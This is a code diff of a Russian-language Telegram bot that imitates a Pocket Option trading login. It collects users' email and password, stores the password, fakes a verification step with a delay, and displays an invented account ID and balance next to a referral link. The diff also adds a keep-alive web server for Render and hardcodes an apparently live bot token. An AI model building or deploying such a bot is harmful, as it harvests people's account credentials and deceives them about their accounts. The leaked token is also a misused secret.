@@ -1,6 +1,8 @@
+import os
 import asyncio
 import logging
 import random
+from aiohttp import web
 from aiogram import Bot, Dispatcher, F, types
 from aiogram.filters import CommandStart
 from aiogram.fsm.context import FSMContext
@@ -8,10 +10,10 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup
 
-# Токен вашего бота от @BotFather
-BOT_TOKEN = "8905419939:AAH4AhrCIvA6s8TOdeY0CU48etE7lUKjTv0"
+# Токен бота
+BOT_TOKEN = "8905419939:AAH4AhrCIvA6s8TOdeY0CU48etE7lUKjTv0"  # <--- Вставьте сюда ваш токен от BotFather
 
-# Настройки ссылок (замените на свои)
+# Настройки ссылок
 REF_LINK = "https://pocketoption.com/register?utm_source=ref"
 SUPPORT_LINK = "https://t.me/your_support"
 FAQ_LINK = "https://t.me/your_faq"
@@ -20,7 +22,6 @@ FAQ_LINK = "https://t.me/your_faq"
 IMAGE_WELCOME = "https://via.placeholder.com/600x350.png?text=Purosanc+Trade"
 IMAGE_ACCOUNT = "https://via.placeholder.com/600x350.png?text=Выберите+Тип+Счёта"
 
-# Состояния FSM
 class AuthState(StatesGroup):
     waiting_for_email = State()
     waiting_for_password = State()
@@ -29,9 +30,7 @@ bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
 # --- Клавиатуры ---
-
 def get_start_keyboard():
-    """Клавиатура при старте"""
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text="🚀 Создать новый аккаунт", callback_data="create_acc")],
@@ -42,7 +41,6 @@ def get_start_keyboard():
     )
 
 def get_main_menu_keyboard():
-    """Клавиатура Главного Меню (из нового скриншота)"""
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [InlineKeyboardButton(text="🚀 Начать торговлю", callback_data="start_trade")],
@@ -56,10 +54,7 @@ def get_main_menu_keyboard():
         ]
     )
 
-# --- Вспомогательные функции ---
-
 async def show_main_menu(target, email: str, uid: str = None, real_bal: float = 0.0, demo_bal: float = 54920.0):
-    """Формирует и отправляет экран Главного Меню"""
     if not uid:
         uid = str(random.randint(10000000, 99999999))
         
@@ -76,18 +71,15 @@ async def show_main_menu(target, email: str, uid: str = None, real_bal: float = 
         f"🏆 **Статус:** 🥉 Bronze"
     )
     
-    # Отправляем сообщение (может быть ответом на сообщение или callback)
     if isinstance(target, types.Message):
         await target.answer(text, parse_mode="Markdown", reply_markup=get_main_menu_keyboard())
     elif isinstance(target, types.CallbackQuery):
         await target.message.answer(text, parse_mode="Markdown", reply_markup=get_main_menu_keyboard())
 
 # --- Хэндлеры ---
-
 @dp.message(CommandStart())
 async def cmd_start(message: types.Message, state: FSMContext):
     data = await state.get_data()
-    # Если пользователь уже залогинен — сразу показываем Главное Меню
     if "email" in data:
         await show_main_menu(message, email=data["email"], uid=data.get("uid"))
         return
@@ -123,10 +115,7 @@ async def process_login(callback: types.CallbackQuery, state: FSMContext):
 @dp.message(AuthState.waiting_for_email)
 async def process_email(message: types.Message, state: FSMContext):
     await state.update_data(email=message.text)
-    await message.answer(
-        "🔒 Введите пароль Pocket Option.\n"
-        "Сообщение будет удалено из чата после отправки."
-    )
+    await message.answer("🔒 Введите пароль Pocket Option.\nСообщение будет удалено из чата после отправки.")
     await state.set_state(AuthState.waiting_for_password)
 
 @dp.message(AuthState.waiting_for_password)
@@ -136,13 +125,11 @@ async def process_password(message: types.Message, state: FSMContext):
     email = user_data.get("email")
     generated_uid = str(random.randint(10000000, 99999999))
 
-    # Удаляем пароль для безопасности
     try:
         await message.delete()
     except Exception:
         pass
 
-    # Сохраняем логин и сгенерированный UID
     await state.update_data(email=email, password=password, uid=generated_uid)
 
     info_text = (
@@ -156,19 +143,32 @@ async def process_password(message: types.Message, state: FSMContext):
         parse_mode="Markdown"
     )
 
-    # Задержка 2 секунды для имитации проверки и перевода в Главное Меню
     await asyncio.sleep(2)
     await show_main_menu(message, email=email, uid=generated_uid)
 
-# Выход из аккаунта
 @dp.callback_query(F.data == "logout")
 async def process_logout(callback: types.CallbackQuery, state: FSMContext):
     await state.clear()
     await callback.answer("Вы успешно вышли из аккаунта", show_alert=True)
     await callback.message.answer("Вы вышли из системы. Нажмите /start для входа.")
 
+# --- Сервер для заглушки порта Render ---
+async def handle_ping(request):
+    return web.Response(text="Bot is alive!")
+
+async def start_web_server():
+    app = web.Application()
+    app.router.add_get('/', handle_ping)
+    port = int(os.environ.get("PORT", 10000))
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+
 async def main():
     logging.basicConfig(level=logging.INFO)
+    # Запускаем веб-сервер и бота одновременно
+    await start_web_server()
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
